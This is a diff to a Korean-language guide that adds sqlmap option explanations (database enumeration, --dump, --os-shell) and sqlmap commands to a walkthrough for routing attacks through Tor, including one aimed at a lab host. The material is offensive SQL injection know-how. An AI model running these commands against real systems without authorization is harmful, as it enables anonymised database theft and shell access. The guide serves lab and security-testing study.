@@ -9,13 +9,42 @@ sudo apt update
 sudo apt install tor torsocks -y
 sudo systemctl start tor
 sudo systemctl enable tor
+
+```
+
+```bash
+
+-u : 대상 URL(Uniform Resource Locator, 통합 자원 위치) 지정
+
+--dbs : 데이터베이스 목록 조회 시도
+
+-D : 특정 데이터베이스(Database) 지정
+
+--tables : 특정 데이터베이스의 테이블 목록 조회 시도
+
+-T : 특정 테이블 지정
+
+--columns : 특정 테이블의 컬럼(열) 목록 조회 시도
+
+-C : 특정 컬럼 지정
+
+--dump : 지정된 컬럼/테이블의 데이터 덤프(데이터 추출) 시도
+
+--level / --risk : 탐지 난이도/공격 레벨 및 위험도 조정 옵션
+
+--technique : 사용될 인젝션 기법 선택 (예: boolean-based, time-based, error-based 등)
+
+--threads : 병렬 스레드 수 조정(속도 관련)
+
+--os-shell : 운영체제 쉘 획득 시도(권한 있는 환경에서만 매우 위험)
+
 ```
 
 ### Tor 연결 확인
 
 ```bash
 torsocks curl https://check.torproject.org
-# "Congratulations. This browser is configured to use Tor." 출력 확인
+sqlmap --wizard
 ```
 
 ### Tor 회로 재설정 (새 IP 획득)
@@ -193,6 +222,8 @@ sqlmap -u "http://example.com/page.php?id=1" \
   --common-tables \
   -t ./SecLists/Discovery/Web-Content/MySQL.txt \
   --hex
+
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
 ```
 
 ### Oracle 대상 공격
